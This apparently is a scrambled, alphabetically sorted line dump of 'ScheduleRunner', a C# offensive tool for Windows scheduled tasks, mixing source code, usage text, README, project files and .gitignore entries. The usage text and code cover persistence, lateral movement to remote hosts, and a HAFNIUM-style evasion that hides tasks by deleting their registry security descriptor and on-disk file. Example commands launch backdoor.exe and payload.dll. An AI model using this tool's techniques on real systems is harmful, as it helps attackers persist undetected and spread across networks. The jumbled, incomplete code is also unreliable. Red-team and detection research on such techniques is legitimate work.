+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""Unmanaged32Assemblies"" type=""xs:string"">"
+"              <xs:element minOccurs=""0"" maxOccurs=""1"" name=""Unmanaged64Assemblies"" type=""xs:string"">"
+"            <xs:attribute name=""CreateTemporaryAssemblies"" type=""xs:boolean"">"
+"            <xs:attribute name=""DisableCleanup"" type=""xs:boolean"">"
+"            <xs:attribute name=""DisableCompression"" type=""xs:boolean"">"
+"            <xs:attribute name=""ExcludeAssemblies"" type=""xs:string"">"
+"            <xs:attribute name=""ExcludeRuntimeAssemblies"" type=""xs:string"">"
+"            <xs:attribute name=""IgnoreSatelliteAssemblies"" type=""xs:boolean"">"
+"            <xs:attribute name=""IncludeAssemblies"" type=""xs:string"">"
+"            <xs:attribute name=""IncludeDebugSymbols"" type=""xs:boolean"">"
+"            <xs:attribute name=""IncludeRuntimeAssemblies"" type=""xs:string"">"
+"            <xs:attribute name=""IncludeRuntimeReferences"" type=""xs:boolean"">"
+"            <xs:attribute name=""LoadAtModuleInit"" type=""xs:boolean"">"
+"            <xs:attribute name=""PreloadOrder"" type=""xs:string"">"
+"            <xs:attribute name=""Unmanaged32Assemblies"" type=""xs:string"">"
+"            <xs:attribute name=""Unmanaged64Assemblies"" type=""xs:string"">"
+"            <xs:attribute name=""UseRuntimeReferencePaths"" type=""xs:boolean"">"
+"            Console.WriteLine("""
+"            Console.WriteLine(""----------------------------------------------------------------------"")"
+"            Console.WriteLine(""["
+"            Console.WriteLine(@""                        """"hide"""": A technique used by HAFNIUM malware that will hide the scheduled task from """"/method:query"""", """"schtasks /query"""", and Task Scheduler"")"
+"            Console.WriteLine(@""                        """"hide"""": Delete scheduled task that used """"hiding scheduled task"""" technique"")"
+"            Console.WriteLine(@""                        (The deletion requires """"NT AUTHORITY"
+"            Console.WriteLine(@""                        (This technique does not support remote execution due to privilege of remote registry. It requires """"NT AUTHORITY"
+"            Console.WriteLine(@""    /argument         - Specify the command line argument for the program"")"
+"            Console.WriteLine(@""    /author           - Specify the author of the scheduled task"")"
+"            Console.WriteLine(@""    /description      - Specify the description for the scheduled task"")"
+"            Console.WriteLine(@""    /folder           - Specify the folder where the scheduled task stores (default: "
+"            Console.WriteLine(@""    /folder           - Specify the folder where the scheduled task stores"")"
+"            Console.WriteLine(@""    /modifier         - Specify how often the task runs within its schedule type. Applicable only for schedule type such as """"minute"""" (e.g., 1-1439 minutes), """"hourly"""" (e.g., 1-23 hours) and """"weekly"""" (e.g., mon,sat,sun)"")"
+"            Console.WriteLine(@""    /oldaction"
+"            Console.WriteLine(@""    /order"
+"            Console.WriteLine(@""    /remoteserver     - Specify the hostname or IP address of a remote computer"")"
+"            Console.WriteLine(@""    /starttime        - Specify the start time for daily schedule type (e.g., 23:30)"")"
+"            Console.WriteLine(@""    /taskname         - Specify the name of the scheduled task"")"
+"            Console.WriteLine(@""    /technique        - Specify evasion technique:"")"
+"            Console.WriteLine(@""    /technique        - Specify when the scheduled task was created using evasion technique:"")"
+"            Console.WriteLine(@""    /trigger          - Specify the schedule type. The valid values include: """"daily"""" and """"onlogon"""""")"
+"            Console.WriteLine(@""    /trigger          - Specify the schedule type. The valid values include: """"minute"""", """"hourly"""", """"daily"""", """"weekly"""", """"onstart"""", """"onlogon"""", and """"onidle"""""")"
+"            Console.WriteLine(@""    /user             - Run the task with a specified user account"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""""Some description"""" /author:netero1010 /technique:hide"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""""Some description"""" /author:netero1010"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:delete /taskname:Cleanup"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:edit /taskname:Cleanup /program:""""C:"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:query /folder:"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:query /taskname:Cleanup /folder:"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:queryfolders"")"
+"            Console.WriteLine(@""    ScheduleRunner.exe /method:run /taskname:Cleanup"")"
+"            Console.WriteLine(@""    ["
+"            Console.WriteLine(@""    create        - Create a new scheduled task"")"
+"            Console.WriteLine(@""    delete        - Delete an existing scheduled task"")"
+"            Console.WriteLine(@""    edit          - Edit an existing scheduled task"")"
+"            Console.WriteLine(@""    move          - Perform lateral movement using scheduled task (automatically create, run and delete)"")"
+"            Console.WriteLine(@""    query         - Query details for a scheduled task or all scheduled tasks under a folder"")"
+"            Console.WriteLine(@""    queryfolders  - Query all sub-folders in scheduled task recursively"")"
+"            Console.WriteLine(@""    run           - Execute an existing scheduled task"")"
+"            Console.WriteLine(@"""
+"            Console.WriteLine(@"""")"
+"            Console.WriteLine(@""================================================================================="")"
+"            Console.WriteLine(@""Create a scheduled task called """"Cleanup"""" that will be executed every 4 hours on a remote server:"")"
+"            Console.WriteLine(@""Create a scheduled task called """"Cleanup"""" that will be executed every day at 11:30 p.m.:"")"
+"            Console.WriteLine(@""Create a scheduled task called """"Cleanup"""" using hiding scheduled task technique:"")"
+"            Console.WriteLine(@""Delete a scheduled task called """"Cleanup"""" that used hiding scheduled task technique:"")"
+"            Console.WriteLine(@""Delete a scheduled task called """"Cleanup"""":"")"
+"            Console.WriteLine(@""Edit a scheduled task called """"Cleanup"""" by changing its execution action to """"C:"
+"            Console.WriteLine(@""Edit a scheduled task called """"Cleanup"""" with multiple execution actions by inserting the new action """"C:"
+"            Console.WriteLine(@""Edit a scheduled task called """"Cleanup"""" with multiple execution actions by replacing the old action """"C:"
+"            Console.WriteLine(@""Example:"")"
+"            Console.WriteLine(@""Execute a scheduled task called """"Cleanup"""":"")"
+"            Console.WriteLine(@""Methods (/method):"")"
+"            Console.WriteLine(@""Options for editing a scheduled task (/method:edit):"")"
+"            Console.WriteLine(@""Options for scheduled task creation (/method:create):"")"
+"            Console.WriteLine(@""Options for scheduled task deletion (/method:delete):"")"
+"            Console.WriteLine(@""Options for scheduled task execution (/method:run):"")"
+"            Console.WriteLine(@""Options for scheduled task lateral movement (/method:move):"")"
+"            Console.WriteLine(@""Options for scheduled task query (/method:query):"")"
+"            Console.WriteLine(@""Perform lateral movement using scheduled task to a remote server using a specific user account:"")"
+"            Console.WriteLine(@""Query all scheduled tasks under a specific folder """""
+"            Console.WriteLine(@""Query all sub-folders in scheduled task:"")"
+"            Console.WriteLine(@""Query details for a scheduled task called """"Cleanup"""" under """""
+"            Console.WriteLine(@""Technique - hide:"")"
+"            Console.WriteLine(@""["
+"            String pathToDelete = Path.Combine(@""C:"
+"            String taskKey = @""SOFTWARE"
+"            String treeKey = @""SOFTWARE"
+"            TaskService ts = CreateScheduledTask(taskName, folder, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, false)"
+"            if (!CheckIfScheduledTaskExists(ts, taskName))"
+"            if (currentUser == @""NT AUTHORITY"
+"          - Specify the index in actions in which the new program will be added (1-based)"")"
+"        // Check if current user is ""NT AUTHOIRTY"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.8""/>"
+"        <xs:element name=""Costura"" minOccurs=""0"" maxOccurs=""1"">"
+"        TaskService CreateScheduledTask(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer, bool hide) {"
+"        [DllImport(""kernel32.dll"", SetLastError = true)]"
+"        bool CheckIfFolderExists(TaskService ts, String folder) {"
+"        bool CheckIfScheduledTaskExists(TaskService ts, String taskName) {"
+"        public TaskManager(String method, String taskName, String folder, String author, String description, String trigger, String program, String argument, string oldAction, string order, String user, String modifier, String startTime, String remoteServer, bool hide) {"
+"        public static Dictionary<string, string> ParseArgs(string[] args) {"
+"        void EditScheduledTask(string taskName, string folder, string program, string argument, string oldAction, string order, string trigger, string startTime, string user, string remoteServer, TaskService ts, bool hide)"
+"        void LateralMovement(String taskName, String folder, String author, String description, String trigger, String program, String argument, String user, String modifier, String startTime, String remoteServer) {"
+"        void ListDetailsForScheduledTask(String taskName, String folder, String remoteServer) {"
+"        void ListScheduledTasks(String taskName, String folder, String remoteServer) {"
+"        void ListScheduledTasksInFolder(TaskFolder fld, String remoteServer) {"
+"        void RemoveScheduledTask(String taskName, String folder, String remoteServer, TaskService ts, bool hide) {"
+"        void RunScheduledTask(String taskName, String folder, String remoteServer, TaskService ts) {"
+"      - Specify the old program that will be replaced with program"")"
+"      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/"
+"      <xs:attribute name=""GenerateXsd"" type=""xs:boolean"">"
+"      <xs:attribute name=""VerifyAssembly"" type=""xs:boolean"">"
+"      <xs:attribute name=""VerifyIgnoreCodes"" type=""xs:string"">"
+"    <BootstrapperPackage Include=""Microsoft.Net.Framework.3.5.SP1"">"
+"    <Compile Include=""Helper.cs"" />"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Compile Include=""TaskManager.cs"" />"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <Error Condition=""!Exists('.."
+"    <None Include=""App.config"" />"
+"    <None Include=""packages.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Costura, Version=5.6.0.0, Culture=neutral, processorArchitecture=MSIL"">"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""Microsoft.Win32.TaskScheduler, Version=2.9.2.0, Culture=neutral, PublicKeyToken=e25603a88b3aa7da, processorArchitecture=MSIL"">"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.ComponentModel.Composition"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Drawing"" />"
+"    <Reference Include=""System.IO.Compression"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Numerics"" />"
+"    <Reference Include=""System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL"">"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"  2022"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <Import Project="".."
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <Target Name=""EnsureNuGetPackageBuildImports"" BeforeTargets=""PrepareForBuild"">"
+"  <package id=""Costura.Fody"" version=""5.6.0"" targetFramework=""net45"" developmentDependency=""true"" />"
+"  <package id=""Fody"" version=""6.5.3"" targetFramework=""net45"" developmentDependency=""true"" />"
+"  <package id=""Microsoft.NETCore.Platforms"" version=""1.1.0"" targetFramework=""net45"" />"
+"  <package id=""NETStandard.Library"" version=""1.6.1"" targetFramework=""net45"" />"
+"  <package id=""System.Collections"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Collections.Concurrent"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Diagnostics.Debug"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Diagnostics.Tools"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Diagnostics.Tracing"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Globalization"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.IO"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.IO.Compression"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Linq"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Linq.Expressions"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Net.Http"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Net.Primitives"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.ObjectModel"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Reflection"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Reflection.Extensions"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Reflection.Primitives"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Resources.ResourceManager"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Runtime"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Runtime.Extensions"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Runtime.InteropServices"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Runtime.InteropServices.RuntimeInformation"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Runtime.Numerics"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Text.Encoding"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Text.Encoding.Extensions"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Text.RegularExpressions"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Threading"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Threading.Tasks"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Xml.ReaderWriter"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""System.Xml.XDocument"" version=""4.3.0"" targetFramework=""net45"" />"
+"  <package id=""TaskScheduler"" version=""2.9.2"" targetFramework=""net45"" />"
+"  <xs:element name=""Weavers"">"
+"  ___/ / /__/ / / /  __/ /_/ / /_/ / /  __/ _, _/ /_/ / / / / / / /  __/ /     "
+" ""' file is in use by other process."")"
+" ""' is invalid."")"
+" ""'."")"
+" ""'..."")"
+" ""."")"
+" ""..."")"
+" 1}."")"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Perform lateral movement using scheduled task (automatically create, run and delete) "
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" Specify evasion technique:<br>- ""hide"": A technique used by HAFNIUM malware that will hide the scheduled task from task query<br><br>[!] https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/<br>[!] This technique does not support remote execution due to privilege of remote registry. It requires ""NT AUTHORITY"
+" Specify how often the task runs within its schedule type. Applicable only for schedule type such as ""minute"" (e.g., 1-1439 minutes), ""hourly"" (e.g., 1-23 hours) and ""weekly"" (e.g., mon,sat,sun) "
+" Specify the schedule type. The valid values include: ""daily"", ""onlogon"" "
+" Specify the schedule type. The valid values include: ""minute"", ""hourly"", ""daily"", ""weekly"", ""onstart"", ""onlogon"", and ""onidle"" "
+" Specify the start time for daily schedule type (e.g., 23:30) "
+" Specify when the scheduled task was created using evasion technique:<br>- ""hide"": Delete scheduled task that used ""hiding scheduled task"" technique<br><br>[!] The deletion requires ""NT AUTHORITY"
+" args[0] == ""-h"" "
+" args[0] == ""/h"" "
+" args[0] == ""help"")"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" except build/, which is used as an MSBuild target."
+" execAction.Path.Equals(oldAction, StringComparison.OrdinalIgnoreCase))"
+" id, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey)"
+" taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey)"
+" taskName, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.WriteKey).DeleteValue(""SD"")"
+" to a newer Visual Studio version. Backup files are not needed,"
+" tools were already developed to simulate the attack using scheduled task. I have been playing around with some of them but each of them has its own limitations on customizing the scheduled task. Therefore, this project aims to provide a C"
+""" /folder:"
+""" and "
+""" must be defined when daily trigger is used. Please try again. For example, "
+""" must be defined. Please try again."")"
+""" or "
+""" parameter is incorrect. Please try again. For example, use "
+""" parameter."")"
+""" to repeat the task daily at 11:30pm."")"
+""" to repeat the task every 4 hours."")"
+""" to repeat the task every 60 minutes."")"
+""" to repeat the task every Monday, Saturday and Sunday."")"
+""" trigger already exists for the specified user. Please try again."")"
+""" trigger already exists for the {td.Principal.UserId} user. Please try again."")"
+""" triggers when editing a task. Please try again."")"
+"""""  "
+""". Please try again. For example, use "
+"""/modifier:"
+"""/modifier:4"
+"""/modifier:60"
+"""/modifier:mon,sat,sun to repeat the task every Monday, Saturday, and Sunday at 11:30pm."")"
+"""/modifier:mon,sat,sun"
+"""/oldaction"
+"""/remoteserver, /taskname, /program"
+"""/starttime"
+"""/starttime:"
+"""/starttime:23:30"
+"""/taskname"
+"""/taskname, /program"
+"""/taskname, /program, /trigger"
+"""daily"
+"""onlogon"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"1. Delete ""SD"" value from ""HKLM"
+"2. Delete scheduled task XML file ""C:"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""Current"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Weavers xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:noNamespaceSchemaLocation=""FodyWeavers.xsd"">"
+"<xs:schema xmlns:xs=""http://www.w3.org/2001/XMLSchema"">"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"CertificateServicesClient /remoteserver:TARGET-PC01"")"
+"CertificateServicesClient"" folder on a remote server"
+"CertificateServicesClient"" on a remote server"
+"CertificateServicesClient"""" folder on a remote server:"")"
+"CertificateServicesClient"""" on a remote server:"")"
+"Costura.Fody.props"" Condition=""Exists('.."
+"Costura.Fody.props')"" />"
+"Costura.Fody.props')"" Text=""$([System.String]::Format('$(ErrorText)', '.."
+"Costura.Fody.props'))"" />"
+"Costura.Fody.targets"" Condition=""Exists('.."
+"Costura.Fody.targets')"" />"
+"Costura.Fody.targets')"" Text=""$([System.String]::Format('$(ErrorText)', '.."
+"Costura.Fody.targets'))"" />"
+"Create a scheduled task called ""Cleanup"" that will be executed every 4 hours on a remote server"
+"Create a scheduled task called ""Cleanup"" that will be executed every day at 11:30 p.m."
+"Create a scheduled task called ""Cleanup"" using hiding scheduled task technique:"
+"Delete a scheduled task called ""Cleanup"" that used hiding scheduled task technique:"
+"Delete a scheduled task called ""Cleanup"""
+"Edit a scheduled task called ""test"" by adding a new exec action and specifying the order (1-based) in which it will appear in the action list. In this example, the new exec action will be added first"
+"Edit a scheduled task called ""test"" by adding a new exec action with argument and specifying the order (1-based) in which it will appear in the action list. In this example, the new exec action will be added first"
+"Edit a scheduled task called ""test"" by adding a new exec action with argument and specifying the order (1-based) in which will appear in the action list and adding a trigger. In this example, the new exec action will be added first and the trigger will be onlogon"
+"Edit a scheduled task called ""test"" which has 1 exec action and will be replaced with the program and argument"
+"Edit a scheduled task called ""test"" which has 1 exec action and will be replaced with the program"
+"Edit a scheduled task called ""test"" which has multiple exec actions and one of them(oldaction) will be replaced with the program and argument"
+"Edit a scheduled task called ""test"" which has multiple exec actions and one of them(oldaction) will be replaced with the program"
+"Execute a scheduled task called ""Cleanup"""
+"Fody.targets"" Condition=""Exists('.."
+"Fody.targets')"" />"
+"Fody.targets')"" Text=""$([System.String]::Format('$(ErrorText)', '.."
+"Fody.targets'))"" />"
+"In the edit functionality the CLI arguments ""/folder"", ""/remoteserver"", ""/user"" and ""/technique"" are used as expected in the other methods too."
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""ScheduleRunner"", ""ScheduleRunner"
+"Query all scheduled tasks under a specific folder """
+"Query details for a scheduled task called ""Cleanup"" under """
+"SYSTEM"" and the task will continue to run until system reboot even after task deletion "
+"SYSTEM"""
+"SYSTEM"""" and the task will continue to run until system reboot even after task deletion)"")"
+"SYSTEM"")"
+"SYSTEM."")"
+"ScheduleRunner.csproj"", ""{FF5F7C4C-6915-4C53-9DA3-B8BE6C5F1DB9}"""
+"ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""Some description"" /author:netero1010 /technique:hide"
+"ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:""Some description"" /author:netero1010"
+"ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /oldaction:""C:"
+"ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /order:1 /trigger:onlogon"
+"ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"" /order:1"
+"ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /argument:""-m 1"""
+"ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /oldaction:""C:"
+"The task will continue to run util next system reboot even if the task is deleted via registry. Therefore, it is better not to use this technique in server for your operation."
+"To remove scheduled task that is created using this technique require to add ""/technique:hide"" in the delete method to remove it properly."
+"To use this technique, you are required to have ""NT AUTHORITY/SYSTEM"" and ScheduleRunner will do the following for you:"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""ScheduleRunner"")]"
+"[assembly: AssemblyTitle(""ScheduleRunner"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""ff5f7c4c-6915-4c53-9da3-b8be6c5f1db9"")]"
+"[task name]"""
+"] /program      - Specify the program that the task runs"")"
+"] /remoteserver - Specify the hostname or IP address of a remote computer"")"
+"] /taskname     - Specify the name of the scheduled task"")"
+"] /trigger      - Specify the schedule type. The valid values include: """"minute"""", """"hourly"""", """"daily"""", """"weekly"""", """"onstart"""", """"onlogon"""", and """"onidle"""""")"
+"] Connected to "" "
+"] Connecting to target server: "" "
+"] Creating the scheduled task: "" "
+"] Current folder: "" "
+"] Deleting the scheduled task: "" "
+"] Executing technique - hiding scheduled task..."")"
+"] Getting sub folders..."")"
+"] Getting tasks..."")"
+"] Listing all folders."")"
+"] Number of sub folder(s): "" "
+"] Number of task(s): "" "
+"] Removing 'SD' value from '"" "
+"] Removing scheduled task on disk artifact - '"" "
+"] Running the scheduled task: "" "
+"] The scheduled task is created."")"
+"] The scheduled task is deleted. However, The deleted scheduled task would continue to run according to the defined triggers until the system rebooted."")"
+"] The scheduled task is deleted."")"
+"] The scheduled task is hidden and invisible now."")"
+"] The scheduled task is started."")"
+"] are mandatory fields."")"
+"__,_/"
+"__,_/_/ /_/_/ /_/"
+"__,_/_/"
+"agent.exe"""" /order:2"")"
+"agent.exe"""" as the second entry:"")"
+"backdoor.exe"""" /argument:""""--exec ls"""""")"
+"backdoor.exe"""" /oldaction:""""C:"
+"backdoor.exe"""" with argument """"--exec ls"""":"")"
+"backdoor.exe"""":"")"
+"notepad.exe"""
+"notepad.exe"""" to """"C:"
+"notepad.exe"""""")"
+"payload.dll /remoteserver:TARGET-PC01"")"
+"payload.dll /user:netero1010"")"
+"xml version=""1.0"" encoding=""utf-8"""
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$tf/
+' as shown below:
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+----
+.</xs:documentation>
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cab
+.cachefile
+.code-workspace
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dotCover
+.dsp
+.dsw
+.e2e
+.fake/
+.gpState
+.hhc
+.hhk
+.hhp
+.history/
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.json
+.ldf
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.msi
+.msix
+.msm
+.msp
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.sln.iml
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tlog
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbp
+.vbw
+.vs/
+.vscode/
+.vshistory/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+/ /_/ / / / / __ 
+/ _ 
+/ __ 
+/ __  / / / / / _ 
+/ ___/ 
+/ ___/ __ 
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+</OutputPath>
+</Project>
+</PublishUrl>
+</PublishUrlHistory>
+</Weavers>
+</configuration>
+</packages>
+</xs:documentation>
+</xs:schema>
+<configuration>
+<packages>
+= 16
+= 32
+= 64
+A number of C
+ASALocalRun/
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPackages/
+AutoTest.Net/
+Backup
+BenchmarkDotNet.Artifacts/
+BundleArtifacts/
+CertificateServicesClient /remoteserver:TARGET-PC01
+ClientBin/
+Costura.Fody.5.6.0
+Costura.dll</HintPath>
+CurrentVersion
+Debug
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EndGlobal
+EndGlobalSection
+EndProject
+FakesAssemblies/
+Fody.6.5.3
+FodyWeavers.xsd
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+LinkID=322105. The missing file is {0}.</ErrorText>
+Microsoft
+Microsoft.Win32.TaskScheduler.dll</HintPath>
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+OpenCover/
+Package.StoreAssociation.xml
+Payload
+Perform lateral movement using scheduled task to a remote server using a specific user account
+PublishScripts/
+Query all sub-folders in scheduled task
+Release
+SOFTWARE
+ScaffoldingReadMe.txt
+Schedule
+ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:
+ScheduleRunner.exe /method:delete /taskname:Cleanup
+ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide
+ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe
+ScheduleRunner.exe /method:edit /taskname:test /program:calc.exe /order:1
+ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:
+ScheduleRunner.exe /method:query /folder:
+ScheduleRunner.exe /method:query /taskname:Cleanup /folder:
+ScheduleRunner.exe /method:queryfolders
+ScheduleRunner.exe /method:run /taskname:Cleanup
+Scheduled task is one of the most popular attack technique in the past decade and now it is still commonly used by hackers/red teamers for persistence and lateral movement. 
+ServiceFabricBackup/
+SolutionGuid = {5788C915-1313-4008-A2C0-707346CCE609}
+StyleCopReport.xml
+System.Runtime.InteropServices.RuntimeInformation.4.3.0
+System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+System32
+TRACE</DefineConstants>
+TaskCache
+TaskScheduler.2.9.2
+Tasks
+TestResult.xml
+This technique was used by threat actor - HAFNIUM and discovered by Microsoft recently. It aims to make the scheduled task unqueriable by tools and unseeable by Task Scheduler.
+Tree
+UpgradeLog
+VisualStudioVersion = 16.0.31205.134
+Windows
+Windows NT
+[Aa][Rr][Mm]/
